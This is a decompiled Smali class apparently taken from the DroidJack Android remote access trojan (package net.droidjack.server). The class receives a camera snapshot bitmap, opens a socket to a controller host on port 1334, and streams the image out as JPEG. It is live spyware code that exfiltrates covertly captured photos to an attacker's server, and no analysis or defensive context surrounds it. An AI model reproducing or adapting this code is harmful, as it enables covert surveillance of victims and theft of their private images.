.class Lnet/droidjack/server/k;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/CamSnapDJ;

.field private final synthetic b:Landroid/graphics/Bitmap;


# direct methods
.method constructor <init>(Lnet/droidjack/server/CamSnapDJ;Landroid/graphics/Bitmap;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/k;->a:Lnet/droidjack/server/CamSnapDJ;

    iput-object p2, p0, Lnet/droidjack/server/k;->b:Landroid/graphics/Bitmap;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()Ljava/lang/Void;
    .locals 5

    :try_start_0
    new-instance v0, Ljava/net/Socket;

    sget-object v1, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const/16 v2, 0x536

    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v1

    iget-object v2, p0, Lnet/droidjack/server/k;->b:Landroid/graphics/Bitmap;

    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x64

    invoke-virtual {v2, v3, v4, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V

    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const/4 v0, 0x0

    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/k;->a()Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method
